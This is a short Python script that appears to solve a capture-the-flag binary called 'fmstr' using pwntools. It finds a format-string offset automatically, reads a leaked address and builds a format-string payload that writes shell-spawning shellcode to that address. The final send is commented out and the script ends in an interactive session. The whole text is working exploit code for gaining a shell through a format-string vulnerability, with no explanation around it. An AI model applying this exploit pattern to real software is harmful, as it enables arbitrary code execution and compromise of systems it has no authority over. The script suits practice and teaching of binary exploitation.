from pwn import *

context.arch = 'amd64'

elf = ELF('./fmstr')

def exec_fmt(pay):
    p = process(elf.path)
    p.sendline(pay)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

p = process(elf.path)
def db(x):
    gdb.attach(x, gdbscript='')
    pause()

addr = u32(p.recv(4))
pay = fmtstr_payload(offset, {addr: asm(shellcraft.sh())}, write_size='short')
# db(p)
# p.sendline(pay)

p.interactive()